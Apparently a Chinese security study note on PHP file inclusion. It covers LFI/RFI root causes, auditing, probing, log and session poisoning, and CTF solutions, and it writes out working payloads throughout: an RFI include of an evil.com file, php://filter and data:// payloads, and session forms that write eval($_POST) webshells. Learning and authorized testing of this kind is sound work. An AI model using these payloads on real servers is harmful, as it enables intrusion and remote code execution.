## 1. 文件包含是什么 🔴 核心 —— 必须吃透,动手复现

### 1.1 定义：一个"代码复用"的语言特性

**文件包含**：程序开发人员通常把可重复使用的函数写到一个单独文件里，使用时"把这个文件的内容拉进来"，而不必重复编写。这个动作叫文件包含（File Inclusion）。

```php
// common.php 里放公共函数
// 业务代码里这样用：
include 'common.php';   // 把 common.php 的内容拉进来，当代码执行
```

> 类比：**`include` 就像"把另一个文件的正文，剪贴到当前位置再读一遍"**。注意关键词是**当代码执行**——它不是在旁边"看一下"那个文件，而是把文件内容**当成程序的一部分跑起来**。
> 这一点极其重要：如果你能控制"包含哪个文件"，你控制的其实不是"读什么"，而是**"哪段内容会被当成代码执行"**。

### 1.2 为什么会存在（root cause）：路径可控 = 数据越界成代码

**正常流程**：开发者写死要包含的文件（`include 'header.php'`），路径来自**代码**，用户管不着。

**开发者的错误假设**：很多功能天生需要"动态包含"——多语言包、模板选择、模块加载、页面路由：

```php
// ❌ 有问题：语言包按用户选的语言加载
$lang = $_GET['lang'];              // source：用户输入（不可信）
include $lang . '.php';             // sink：把不可信数据拼进"被执行的路径"
```

```php
// ✅ 修复思路：白名单映射，用户输入只能选"键"，永远不进路径
$map = ['cn' => 'zh.php', 'en' => 'en.php'];
$file = $map[$_GET['lang']] ?? 'zh.php';
include __DIR__ . '/lang/' . $file;
```

**root cause（一句话）**：**程序把"用户传入的数据"当成了"要执行的代码所在的路径"——这是和 SQL 注入、命令注入同一个根：数据越界成了指令。**
- SQL 注入：数据进了 SQL 语句
- 命令注入：数据进了 shell 命令
- **文件包含：数据进了"被 include 的文件路径"，于是你可以指向任意文件**

> 🔎 **补充（非原笔记内容）**：为什么"指向任意文件"就等于"代码执行"？两句话：
> 1. 如果那个文件**本身含 PHP 代码**（被上传的图片马、日志里被你写进去的一句话、session 文件），包含它 = 代码执行。
> 2. 如果那个文件**不含 PHP 代码**（`/etc/passwd`、配置文件、源码），那你至少能**读**它（源码被当代码执行了怎么办？见 §5.1 的 `php://filter`）。
>
> 所以文件包含的危害是**两档**：**读（信息泄露）→ 执行（RCE）**。很多人只记得"能读 /etc/passwd"，其实真正的杀伤力在第二档。

**这条链最该记住的特征**：**文件包含漏洞几乎从来不是"单独的洞"，它是"放大器"**——它把"上传了但执行不了"、"日志里有我的请求"、"session 里有我写的东西"这些看似无害的条件，放大成 RCE。

### 1.3 分类：LFI / RFI，以及"差异由什么决定" 🔴 核心

| 类型 | 英文 | 包含的目标在哪 | 典型 payload |
|---|---|---|---|
| **本地文件包含** | Local File Include（LFI） | 目标服务器**本机**的文件 | `?file=../../../../etc/passwd`、`?file=/var/log/nginx/access.log` |
| **远程文件包含** | Remote File Include（RFI） | 攻击者**自己服务器**上的文件 | `?file=http://evil.com/1.txt`（1.txt 内容为 `<?php system('id');?>`） |

**"差异原因：代码过滤 + 环境配置文件开关"——这句话要展开成能判断的东西**：

| 决定因素 | 具体是什么 | 结果 |
|---|---|---|
| **代码层过滤** | 是否拦 `http://`、`php://`、`..`、`/`、是否只允许后缀等 | 过滤严 → 只能 LFI；过滤松 → RFI 也可 |
| **`allow_url_include`**（PHP） | 能否 include **URL 形式**的资源 | `Off`（默认，自 PHP 5.2 起默认关、7.4 起标记 deprecated）→ **RFI 免谈**，`data://`、`php://input` 也用不了 |
| **`allow_url_fopen`** | 能否用 URL 形式打开文件（`fopen`/`file_get_contents`） | 影响"读远端"的一般函数，**对 `include` 的影响以 `allow_url_include` 为准** |
| **`open_basedir`** | PHP 只允许访问哪些目录 | 设了就出不了那个目录（`../` 再多也白搭） |
| **文件系统权限** | Web 用户能不能读（日志、`/etc/shadow`） | 读不了就是读不了，跟漏洞无关 |
| **目标文件是否存在** | 日志路径、session 路径、临时目录位置 | 路径不对 → 包含失败（`include` 会警告并继续） |

> 💡 **实战含义**：**绝大多数现代 PHP 环境是 `allow_url_include=Off`**，所以你碰到的大概率是 LFI，主战场是 `php://filter`（不需要 `allow_url_include`）+ 日志 / session / 上传文件。RFI 更常见于**老系统、CTF、以及被改成 On 的内网应用**。
>
> 🔎 **补充（非原笔记内容）**：`allow_url_include` 属于 `INI_SYSTEM`，**只能在 `php.ini` 或启动参数里改，运行时 `ini_set` 没用**（PHP 手册明确标注）。这点在 CTF 里会看到题面直接告诉你"allow_url_include=On"。

### 1.4 `include` vs `require`：错误处理差异 🟡 重要 —— 懂原理,探测时用到

| 函数 | 文件不存在 / 出错时 | 对渗透的意义 |
|---|---|---|
| `include` | 抛 **Warning**，脚本**继续执行** | 报错里会带上**被包含的路径**——这是最直接的"路径确认"信号 |
| `include_once` | 同上，但同一个文件只包含一次 | 影响"重复包含"能不能触发副作用 |
| `require` | 抛 **Fatal error（E_COMPILE_ERROR）**，脚本**终止** | 页面直接白屏/500，说明它用的可能是 require |
| `require_once` | 同上，只包含一次 | 同上 |

> 实战用法：**故意给一个不存在的文件名**（`?file=aaaa`），看页面是"警告 + 页面其余部分正常"还是"整页崩掉"——前者大概率 `include`，后者 `require`。`include` 更好利用，因为报错里经常直接吐出**服务器上的绝对路径**，帮你确定当前目录和后续相对路径怎么写。

## 2. 白盒审计：怎么在源码里几分钟找到包含点 🟡 重要

### 2.1 三条发现路径

| 路径 | 具体做法 | 适合场景 |
|---|---|---|
| **① 功能追踪** | 从"多语言切换 / 模板选择 / 页面路由 / 模块加载"这类**天然需要动态包含**的功能点，追到它的代码 | 拿到一个完整项目、想找"设计上就会用 include"的地方 |
| **② 函数搜索** | 直接全局搜危险函数名，再逐个看参数是否可控 | 最快，先用这个扫一遍 |
| **③ 伪协议绕过修复** | 发现代码"过滤了 `..` 但没过滤 `php://`"，或"过滤了 http 但没过滤 data"，从防御的缺口反推 | 已确认有过滤、想找绕过 |

### 2.2 各语言要搜的函数（PHP 是主战场）

| 语言 | 危险函数 / 类 | 分级 |
|---|---|---|
| **PHP** | `include`、`include_once`、`require`、`require_once` | 🔴 核心 —— 这四个必须背下来 |
| PHP（间接） | `fopen`、`file_get_contents`、`readfile`、`show_source`、`highlight_file`、`copy`、`file_put_contents` | 🟡 重要 —— 不是"包含"，但一样能读/写文件，常和包含配合 |
| **Java** | `java.io.File`、`java.io.FileReader`、`java.io.FileInputStream`、`ClassLoader.getResource` | 🟢 了解 —— 知道搜这几个 |
| **ASP.NET** | `System.IO.FileStream`、`System.IO.StreamReader`、`Server.Execute`、`Response.WriteFile` | 🟢 了解 —— 知道搜这几个 |

> **PHP 的四个函数是"自己的代码把文件当代码跑"；Java/.NET 的那几个更像是"读文件"**——所以别混：PHP 的 include 家族才是真正的"代码包含"，Java 那边对应的坑通常是**模板注入、类加载路径可控、文件读取**这几类问题。
> **可迁移思路**：看到"语言自带一个把其他文件当代码执行/当资源加载的机制"，就去问"这个机制的**目标路径**是否可控"。
> **细节备查**：Java 侧的函数清单和审计要点，用到时查 [[01_Java数据库框架与SQL注入审计笔记]] 与后续 Java 审计笔记。

### 2.3 审计时问三个问题

1. **目标路径可控吗？** 来自 `$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`/header/数据库/配置，还是写死的常量？
2. **过滤拦了哪些字符/协议？** 只拦了 `../`？没拦 `php://` 和 `data://`？只做了 `str_replace('../','')`（可被 `....//` 绕过）？
3. **包含进来到什么上下文？** 是当代码执行（include），还是只是读出来显示（file_get_contents）？前者能 RCE，后者只是读。

## 3. 黑盒分析：没有源码时怎么找 🟡 重要

### 3.1 先看参数名——这类参数名八成在传文件名

`path`、`dir`、`file`、`page`、`archive`、`eng`（多语言）、`lang`、`language`、`tpl`、`template`、`theme`、`mod`、`module`、`view`、`load`、`doc`、`include`、`inc`

**常见出现位置（按实战频率）**：
- 多语言 / 多主题切换（`?lang=cn`、`?theme=dark`）
- 页面路由（`?page=about`、`?mod=user`）
- 文件下载 / 文件预览 / 图片显示（`?file=xxx.pdf`、`showimage.php?file=`）
- 模板 / 插件 / 模块加载（后台功能里尤其多）
- 报错页、日志查看、帮助文档

### 3.2 三个判断"是否真的包含成功"的现象

| 现象 | 说明什么 |
|---|---|
| 页面内容变化 / 出现了别的文件内容 | 包含成功（最直接） |
| 出现 PHP Warning，里面带着**文件路径** | 包含执行过了，只是目标不存在——**已经确认是包含点**，剩下的只是把路径写对 |
| 页面空白 / 500 | 可能是 `require` 失败或包含到一半崩了；换 `../` 层数再试 |

### 3.3 探测三步（每一步都在排除一种可能）

**步骤 1：确认它是包含，而不是"读文件后输出"**
- 做什么：`?file=index.php`（包含自身）或 `?file=1.txt`
- 为什么：如果它 `include` 了一个 php 文件，你会看到**它的输出被当代码执行后的结果**（比如页面结构重复），而不是源码原文；如果看到的是源码原文，那是 `file_get_contents` 类，危害只有"读"。
- 得到什么：区分"能执行"和"只能读"。

**步骤 2：确认路径基准在哪**
- 做什么：依次试 `?file=./index.php`、`?file=../index.php`、`?file=../../../../etc/passwd`
- 为什么：`include` 的相对路径是**相对于当前执行脚本的目录**（也可能受 `include_path` 影响），层数不对就找不到文件。
- 得到什么：找到能读到已知文件（`/etc/passwd`、`C:\Windows\win.ini`）的那个深度，后面的 payload 都基于它。

**步骤 3：套伪协议**
- 做什么：`?file=php://filter/read=convert.base64-encode/resource=index.php`
- 为什么：直接包含 php 文件会把源码当代码执行、看不到源码；加 base64 过滤器后，**源码变成 base64 字符串输出**，就能读了。
- 得到什么：拿到源码 → 可以找数据库口令、其他漏洞、上传点、日志路径。

> ⚠️ **判断容易错的地方**：包含 `http://...` 没成功，**不能立刻断定"没有 RFI"**——很可能只是 `allow_url_include=Off` 或过滤了协议；同理 `php://input` 无效也可能是同样原因。**先分清是"代码拦"还是"配置关"，再决定换哪个协议。**

## 4. 本地利用四条路（LFI → 能执行的文件从哪来）🔴 核心

本地包含的难点不是"包含"，而是**"服务器上得有一个我能控制内容、且内容是 PHP 代码的文件"**。下面四条路就是"怎么造出这个文件"。

### 4.1 路线一：配合文件上传 🔴 核心 —— 最正的路子

**思路**：先按 [[00_文件上传漏洞-原理与绕过全集]] 的方法传一个**图片马**（`GIF89a` + `<?php ... ?>`，后缀 `.jpg`/`.png`），它因为后缀不是 php 而**不会被解析执行**——但它**已经被包含漏洞里的 `include` 当 php 执行了**。

```
上传 x.jpg（内容是 GIF89a + php 代码）→ 拿到存储路径
   ↓ 想尽办法让它"被执行"
?file=./upload/x.jpg   ← 包含漏洞在这里替它执行
```

> 💡 这正是 [[00_文件上传漏洞-原理与绕过全集]] §0.1 里"什么时候图片马才有用"的答案之一：**文件包含漏洞能强制把任意文件当 PHP 执行**。上传卡在"执行"这一关时，包含漏洞就是那把钥匙——这也是为什么这两个漏洞**经常一起出现、一起利用**。

### 4.2 路线二：日志包含（log poisoning）🟡 重要 —— 没有上传点时的主力

**原理**：Web 服务器（Nginx/Apache）会把**每一个请求**写进访问日志，日志里包含**User-Agent、请求路径**等字段。你在 UA 里写一句 PHP 代码，这句代码就**被永久写进了日志文件**；再用包含漏洞去包含那个日志文件，代码就执行了。

**步骤（三问）**：

**步骤 1：往日志里塞代码**
- 做什么：Burp 抓任意一个请求，把 `User-Agent` 改成 `<?php system('tac flag.php');?>`
- 为什么：UA 是**少数几个不用 URL 编码就能塞任意字符**的位置（URL 里的 payload 会被百分号编码，`<` `?` 会被转义），所以 UA 是日志注入的首选。
- 得到什么：日志文件里多了一行，含你的代码原文。
- 如果不是预期：日志可能对 UA 做了转义/截断（部分 WAF），换 `Referer`、`X-Forwarded-For`、请求路径本身再试。

**步骤 2：找到日志路径**
- 常见默认路径（**默认路径测试**）：
```
/var/log/nginx/access.log        # Nginx 访问日志（最常见）
/var/log/nginx/error.log
/var/log/apache2/access.log      # Debian/Ubuntu Apache
/var/log/httpd/access_log        # CentOS/RHEL Apache
/var/log/auth.log                # SSH 认证日志（用用户名注入）
```
- 为什么：这是"知道路径、按默认路径猜"的路子；真实环境可能被改到别处（那就得靠 §3.3 读源码/读配置拿到）。
- **失败说明**：路径对但读不到 → 多半是**权限**（Web 用户读不了日志），不是路径错。

**步骤 3：包含日志文件**
- 做什么：`?file=/var/log/nginx/access.log`
- 为什么：日志里已经有你的代码，包含它 = 执行 + 页面会把整段日志打印出来（你会在返回里看到自己的 payload 和其他访问记录）。
- 得到什么：命令回显 / 写 Shell。

> ⚠️ **为什么 CTF 80/81 会"放弃文件名带 php 关键字"**：那两关对 `file` 参数做了过滤（含 `php` 等关键字就拦），所以不能直接 `?file=php://filter...`，只能**改用 `file://`、`zlib` 等其他协议去读日志**，或直接走日志包含这条"不碰 php 关键字"的路。

### 4.3 路线三：SESSION 包含 + 条件竞争 🟡 重要

**原理**：PHP 把每个会话的数据存在服务器上的一个文件里（`sess_<PHPSESSID>`）。而**上传文件时**如果表单里带一个叫 `PHP_SESSION_UPLOAD_PROGRESS` 的字段，PHP 会把"上传进度信息"（其中包含你填的 `filename`）写进这个 session 文件——**于是 session 文件里有了你控制的内容**。

**为什么必须"条件竞争"**：默认配置 `session.upload_progress.cleanup=On` 会在**请求结束时就把进度信息清掉**，session 文件里你能控制的那段内容存在时间极短。所以做法是：**一边不停地上传（持续写入 payload），一边不停地包含 session 文件**，抢在"写入后还没被清掉"的那一瞬间。

**构造（原笔记给出的表单，要点已标）**：
```html
<form action="http://目标/" method="POST" enctype="multipart/form-data">
  <!-- 关键1：这个隐藏字段名是 PHP 内置的，值就是注入进 session 的代码 -->
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS"
         value="<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>');?>" />
  <input type="file" name="file" />
  <input type="submit" value="submit" />
</form>
```
配合：**Burp Intruder/多线程脚本** 同时跑两类请求——
1. 反复 POST 上面这个表单（不带 `PHPSESSID` cookie 时 PHP 会自动生成一个新的；带固定 `PHPSESSID=xxx` 才能稳定命中同一个 session 文件）；
2. 反复请求 `?file=/tmp/sess_xxx`（或 `/var/lib/php/sessions/sess_xxx`）。

**要点**：
- **session 文件路径**由 `session.save_path` 决定，常见 `/tmp`、`/var/lib/php/sessions`、`/var/lib/php5`。
- **必须自定义 session 名字/ID**：用固定的 `PHPSESSID`，否则每次请求生成新 session，你永远包含不到正确的那一个。
- 竞争失败的表现：包含到的 session 文件是空的，或只有 `upload_progress_xxx|a:...` 这种序列化数据而没有你的代码（被清掉了）。

> 🔎 **补充（非原笔记内容）**：这条路线在真实环境里成功率远低于日志包含，因为要求"session 目录可读 + cleanup 时机刚好"。它的价值在 CTF（82-86 关就是专门练这个）和**理解"临时文件也是一类可控文件"**这个思路。同思路的其他玩法：`/tmp/phpXXXXXX`（上传临时文件）、`/proc/self/environ`（旧内核的环境变量注入）、`/proc/self/fd/*`。

### 4.4 路线四：伪协议（不需要任何"外部文件"）🟡 重要 —— 具体打法全在 §5

如果目标环境允许，`php://input`、`data://` 可以**完全不用在服务器上放文件**就把代码喂进去执行——详见 §5.3。这是最干净的一条路，但依赖 `allow_url_include=On`。

| 路线 | 需要什么 | 成功概率 | 典型场景 |
|---|---|---|---|
| ① 配合上传 | 有上传点 + 上传目录可读 | 高 | 实战最常见 |
| ② 日志包含 | 日志路径已知/可读 + UA 不被转义 | 中高 | 实战常用 |
| ③ SESSION 包含 | session 目录可读 + 竞争成功 | 中低 | CTF 主线 |
| ④ 伪协议直接执行 | `allow_url_include=On` | 看配置 | CTF / 老系统 |

## 5. 伪协议全解（LFI 变 RCE 的主武器）🔴 核心

> 语法总览：`协议://[参数]/resource=目标`
> 例如 `php://filter/read=convert.base64-encode/resource=index.php`
> —— `php://filter` 是**包装器**，`read=` / `write=` 指定**过滤器方向和链**，`resource=` 指定**真正要读写的文件**。

**先对号入座：前提与失败原因（照抄打不出来时，按这张表排查）**

| 协议 / 手法 | 环境前提 | 失败最常见的原因 |
|---|---|---|
| `file://` | 无需特殊开关；要**有读权限** | 路径不存在；`../` 层数不对（相对的是当前执行脚本目录）；被过滤拦了 `file` 字样 |
| `php://filter/read=…` | **不需要** `allow_url_include`；要有读权限 | 文件名漏了扩展名；目标文件不存在；过滤拦了 `php://` |
| `php://filter/write=…` | 同上；**目标目录必须可写** | 目录不可写、被 `open_basedir` 限制、编码器与 payload 没对齐（见 §5.6 ①） |
| `php://input` | **`allow_url_include=On`**；body 原样可读 | 开关为 Off；WAF 拦 `<?php`；框架没把原始 body 交出来 |
| `data://` | **`allow_url_include=On`**；数据里不能有会被 URL 解码搞坏的字符 | 开关为 Off；`?`/`<` 被截断 → 改用 `;base64,` 变体 |

> 排查顺序：**先看开关（`allow_url_include` / `open_basedir`）→ 再看权限（读 / 写）→ 最后看过滤**。三样都不是，才该怀疑 payload 本身——这是大多数人排错时反着来的地方。

### 5.1 读文件

#### ① `file://` —— 直接读本地文件
```
?file=file:///etc/passwd                     # Linux
?file=file:///C:\Windows\win.ini             # Windows
```
- 为什么要用 `file://` 而不是直接写路径：**当过滤只拦了 `../` 或某些关键字时，协议前缀可以绕过**（也可能反过来被拦，见 §8）。
- 注意三个斜杠：`file://` + `/etc/passwd` = `file:///etc/passwd`。

#### ② `php://filter/read=convert.base64-encode/resource=xxx` —— 读源码（最常用）
```
?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
- **为什么必须 base64**：直接 `include 'config.php'` 会把 config.php **当代码执行**（要么报错，要么什么都不输出，你看到的是执行结果而不是源码）。加上 `convert.base64-encode` 过滤器后，文件内容在"被当成 php 执行之前"就被编码成 base64 字符串，页面直接显示这串 base64——**复制出来解码就是源码**。
- **正常输出长什么样**：一长串 `PD9waHAg...` 的 base64（`PD9waHA` 解码就是 `<?php`）。
- **这招不需要 `allow_url_include`**，所以现代环境里它是你最先该试的东西。

> 🔎 **补充（非原笔记内容）**：读源码的价值远大于"读 /etc/passwd"。读 `config.php`/`.env` 能拿数据库口令和云密钥；读源码能发现别的漏洞（上传点、SQL 拼接、后台路径）。**"能读"要顺着往"读到什么值钱"走**，这正是报告里"影响证明"的写法（见 §7.3）。

### 5.2 写文件：`php://filter/write=...`（能写文件 = 直接拿 Shell）

#### ① base64 方式
```
?file=php://filter/write=convert.base64-decode/resource=123.php
POST body: aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
```
**机制拆解**：

| 片段 | 作用 | 为什么需要 |
|---|---|---|
| `php://filter/write=` | 声明"写"方向 + 过滤器 | 读用 `read=`，写用 `write=` |
| `convert.base64-decode` | 写入前把数据 **base64 解码** | 传过去的是"看起来无害的 base64"，落盘时才变成 `<?php ...`——绕过"内容不能含 php 代码"的过滤 |
| `resource=123.php` | 目标文件 | 相对路径 = 相对当前执行脚本目录；需目标目录**可写** |
| body 里的 base64 | 一句话木马的 base64 | `PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==` 解码 = `<?php @eval($_POST[a]);?>` |

> [!warning] ⚠️ 原笔记这条 payload 的 `aa` 前缀在我这里会失败（落盘是空文件）
> 四种写法的字节级对比见 **§5.6 ①**。结论先记住：**前缀要么不加，要么必须是 4 的倍数**（base64 按 4 字符一组解码，2 个字符会把后面全部错位）。

#### ② rot13 方式（凯撒 13）
```
?file=php://filter/write=string.rot13/resource=2.php
POST body: <?cuc riny($_CBFG[1]);?>
```
- `string.rot13` 过滤器把每个字母移 13 位；你写"移过位的代码"，落盘时再移回去 → 得到 `<?php eval($_POST[1]);?>`（**实测通过**，落盘字节见 §5.6 ②）。
- **好处**：body 里不含 `eval`、`$_POST` 这些关键字，绕过内容黑名单。
- **注意**：rot13 只转字母，`<`、`?`、`$`、`_`、`[`、`]` 原样保留，所以 payload 里带中文/数字时没影响，但**代码里不能出现 rot13 前后相同的依赖**（数字不变，`1` 还是 `1`）。

#### ③ iconv 字节反转方式（CTF 117 关，原笔记称为"新的算法"）
```
?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
POST body: ?<hp pvela$(P_SO[T]a;)>?
```
- **机制**：`UCS-2LE` ⇄ `UCS-2BE` 是**双字节编码的字节序转换**，效果就是**每两个相邻字节交换位置**。所以你把正常代码"每两字节倒着写"（`?<hp pvela$(P_SO[T]a;)>?`），写盘时再换回来，落盘就是 `<?php eval($_POST[a]);?>`。
- **实测通过**：落盘正是 `<?php eval($_POST[a]);?>`，**原笔记这条 payload 正确**（字节级对比见 §5.6 ③）。
- **好处**：body 里连 `<?php`、`eval`、`$_POST` 的字样都没有，能过几乎所有内容黑名单。
- **翻车点**：字节数必须是偶数（双字节编码），payload 长度凑不齐要补空格；不补会报 `invalid multibyte sequence`（我实测补错位置就直接报这个）。

> 三种写文件手法的选择：**内容过滤只看关键字 → rot13/iconv；只看内容不含 `<?php` → base64；目标目录不可写 → 全都白搭（先找可写目录：`/tmp`、上传目录、缓存目录）**。

### 5.3 直接执行代码：不需要在服务器上放文件

| 协议 | 用法 | 前提 | 为什么有效 |
|---|---|---|---|
| `php://input` | `?file=php://input`，POST body: `<?php system('id');?>` | **`allow_url_include=On`** | 包含的就是 HTTP 请求体，请求体是攻击者写的，等于把请求体当代码执行 |
| `data://text/plain` | `?file=data://text/plain,<?php phpinfo();?>` | **`allow_url_include=On`** | 把内联数据当成一个"远程文件" |
| `data://text/plain;base64` | `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` | 同上 | base64 变体，避免 `<?`、`php` 等字符被 URL 检测发现 |

**关键 payload 拆解**：

| 片段 | 作用 | 为什么需要 |
|---|---|---|
| `data://` | 内联数据包装器 | 不需要外网服务器 |
| `text/plain` | MIME 类型 | 语法要求（`data://<mime>;base64,<数据>`） |
| `,` 或 `;base64,` | 分隔数据 | —— |
| `PD9waHAgcGhwaW5mbygpOz8+` | `<?php phpinfo();?>` 的 base64（**已核对**） | base64 里没有 `<?php`、`<`、`?`，绕过关键字与 URL 特殊字符过滤 |

> 坑：`data://` 里的 `<?php ... ?>` 直接写会出现 `?`、`<` 被 URL 解析/过滤破坏，所以**实际打的时候 base64 变体更稳**。这也是 CTF 79 与 88 关的核心差别（88 关过滤了 `php`、各种符号，只能走"无符号 base64"）：原笔记 88 关的 payload `file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk`，解码结果是 `<?php system('tac *.php');echo 123;?>ad`（**已核对**）——**末尾的 `ad` 是"补位垃圾"**：base64 缺 `=` 时靠它凑长度，解出来落在 `?>` 之后，不会执行，无害。

### 5.4 其他协议 🟢 了解 —— 读一遍,知道碰到时查什么

| 协议 | 用途 | 说明 |
|---|---|---|
| `zlib://`、`compress.zlib://`、`compress.bzip2://` | 读压缩文件 / 绕过某些关键字过滤 | 需要对应扩展；CTF 80/81 提到"利用其他协议如 file、zlib"就是这条路 |
| `phar://` | 触发 PHP 反序列化（phar 元数据） | 需要能上传一个 phar 文件；属于"包含 + 反序列化"组合拳 |
| `zip://` | 读 zip 包内文件 | 常用于"上传 zip 后读里面的 php" |
| `expect://` | 直接执行命令 | **需要安装 expect 扩展，默认没有** → ⚪ 扫过，现网几乎碰不到 |
| `php://filter` 任意链（synacktiv 工具） | 无需上传文件、仅靠 filter 链构造任意内容 → LFI 变 RCE | 高阶玩法，工具见 §5.5 |

**可迁移思路**：凡是"能拼接协议前缀"的地方，就去问"有没有一个协议能把它变成读 / 写 / 执行"。**细节备查**：各协议支持的 PHP 版本与扩展依赖，以 PHP 官方 `wrappers` 文档为准。

### 5.5 进阶：PHP filter chain 生成器 🟢 了解

- 工具：`synacktiv/php_filter_chain_generator`（Python CLI），已被多家安全公司在实战中引用。
- 用法：`python3 php_filter_chain_generator.py --chain '<?php system("id");?>'` → 输出一长串 `php://filter/convert.iconv...|convert.base64-decode/resource=php://temp`，直接塞进易受攻击的参数即可执行。
- **为什么存在**：在"**只能控制 include 的参数、不能上传任何文件**"的最严场景下（例如某些 CTF 与真实 SPA 后端），它把 `php://filter` 的编码过滤器当成"任意写入器"用。
- **代价**：链很长（URL 长度可能超限）、依赖具体 PHP 版本/可用 filter；**只当"知道有这条路"，别背**。

### 5.6 实测记录：三条写文件 payload 的真机结果 🟡 重要 —— 照抄打不出来时先看这里

环境：本机 `PHP 7.3.4 (NTS)`。做法是用 `fopen("php://filter/write=<filter>/resource=<file>","w") + fwrite` 复现，再把落盘文件按**字节**核对（`bin2hex`），不看"页面看着对不对"。

**① base64 解码写文件（§5.2 ①）——四种写法的差异**

| 写入 body | 落盘结果 | 结论 |
|---|---|---|
| `PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==`（完整 base64，**无前缀**） | ✅ 正好是 `<?php @eval($_POST[a]);?>` | **首选写法** |
| `aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==`（**原笔记写法**，前缀 2 字符） | ❌ PHP 报 `invalid byte sequence`，**文件为空** | 2 不是 4 的倍数，整串错位 |
| `aa` + 去掉 `==` 的 base64 | ❌ 落盘乱码 | 同上，错位 |
| `aaaa` + 完整 base64（前缀 4 字符） | ✅ 成功，`<?php` 前多 2 字节垃圾（在 PHP 标签外，无害） | 前缀必须是 **4 的倍数** |

**② rot13 写文件（§5.2 ②）**：写 `<?cuc riny($_CBFG[1]);?>` → 落盘字节 `3c3f706870206576616c28245f504F53545b315d293b3f3e` = `<?php eval($_POST[1]);?>` ✅ 与原笔记一致。

**③ iconv 字节反转写文件（§5.2 ③）**：写 `?<hp pvela$(P_SO[T]a;)>?` → 落盘字节 `3c3f706870206576616c28245f504F53545b615d293b3f3e` = `<?php eval($_POST[a]);?>` ✅ 与原笔记一致。

> ③ 这条值得记一笔：我最初按"每两字节交换"手工推算，以为原文 `pvela` 是笔误（应作 `pveal`），实测证明**原文正确、我的推算错了**。凡是"编码器/过滤器/截断/版本行为"这类问题，推算容易骗自己，跑一遍最省事。

| **79** | `data://` + 远程包含 | `?file=data://text/plain,<?=system('tac flag.*');?>`<br>`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==`<br>`?file=http://www.xiaodi8.com/1.txt`（1.txt 内容 `<?php system('tac flag.php');?>`） | 三种"不用在服务器放文件"的路子；`<?=` 是 `<?php echo` 的短标签 |
| **80 / 81** | 日志包含（连 `file://`、`zlib` 等一起用） | UA 写入 `<?php ... ?>` → `?file=/var/log/nginx/access.log` | 题目过滤了 `file` 参数里的 php 相关关键字，所以不能走 `php://filter`，只能靠"日志里已有我写的代码"这条 |
| **82～86** | SESSION 包含 + 条件竞争 | `PHP_SESSION_UPLOAD_PROGRESS` 表单 + 固定 `PHPSESSID` + 多线程抢时间窗 | 见 §4.3；核心是"抢 session 文件里 payload 还没被清掉的那一瞬间" |
| **87** | `php://filter/write` 写文件（base64 / rot13） | `?file=php://filter/write=convert.base64-decode/resource=123.php` + body base64<br>`?file=php://filter/write=string.rot13/resource=2.php` + body `<?cuc riny($_CBFG[1]);?>` | **不能上传、但能写文件**时，用过滤器在落盘时把"无害内容"还原成 php。⚠️ **base64 那条的前缀问题见 §5.2 实测框** |
| **88** | `data://` base64 + 绕内容过滤 | `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk` | 过滤 `php` 和各种符号 → 只发 base64（无 `=`），末尾 `ad` 补位；实测解码为 `<?php system('tac *.php');echo 123;?>ad` |
| **117** | `php://filter/write` + `convert.iconv` 字节反转 | `?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php` + body `?<hp pvela$(P_SO[T]a;)>?` | 见 §5.2 ③；**已实测落盘正好是 `<?php eval($_POST[a]);?>`** |

**从这七关能抽出的通用套路（比 payload 值钱）**：

```
能读 → php://filter/read=base64     （先摸源码、找死路）
能写 → php://filter/write=编码器    （落盘时还原成 php）
能执行 → php://input / data://      （需要 allow_url_include=On）
都没有 → 造文件：上传马 / 日志 / session
被过滤 → 换协议（file/zlib）、换编码（rot13/iconv/base64）、换载体（UA/Referer/路径）
```

## 7. 实战方向（SRC / 授权项目）🟡 重要

### 7.1 去哪找包含点（对照 [[SRC漏洞挖掘经验-老手如何一眼看出重点]]）

1. **多语言 / 多主题 / 模板切换**——最经典，参数直接是文件名
2. **文件下载 / 预览 / 图片显示接口**（`showimage.php?file=`、`download?path=`）
3. **后台的"模块 / 插件 / 页面"加载**（`?mod=`、`?page=`、`?act=`）
4. **报错 / 日志 / 帮助文档查看**功能
5. **前端 JS 里的隐藏接口**——扒 JS 找 `?file=`、`?tpl=`
6. **静态资源代理**（`?url=` 类接口，既可能是 SSRF 也可能是包含）

### 7.2 最小验证（不破坏目标）

- 用**目标自己的文件**证明：`?file=php://filter/read=convert.base64-encode/resource=index.php` 能解出源码，就足以证明"可读任意文件"，**不需要去读 `/etc/shadow`、不需要写 shell**。
- 涉及**写文件/执行命令**的验证（日志包含、写 shell），**必须有书面授权**，并在报告里如实写明执行了什么、影响范围，测试后清理。

### 7.3 怎么证明影响（决定报告定级）

| 证明层级 | 证据 | 定级影响 |
|---|---|---|
| 弱 | 能读 `/etc/passwd`（普通用户可读） | 常被判"信息泄露-低/中" |
| 中 | 读到 `config.php` / `.env` 里的**数据库口令、云 AK/SK、JWT 密钥** | 高：等于拿到后台/云资源 |
| 高 | 读取源码定位**上传点/后台口令** → 进入后台 | 高：业务权限失守 |
| 最高 | 写文件 / 日志包含拿到 **RCE**，并有命令回显证据 | 严重：服务器控制权 |

> **报告写法**：把"我读了什么、里面有什么值钱的东西、因此能做什么"三句写清。**"能读 /etc/passwd" 这种没有业务价值的证明，在 SRC 里经常被降级**——和 [[00_文件上传漏洞-原理与绕过全集]] 里"传上去 ≠ 能执行"是同一个道理：**能碰到 ≠ 有危害，要说清危害落在哪个业务资产上**。

> 参考（原笔记给的实战复盘，**我未核实文章内容**）：
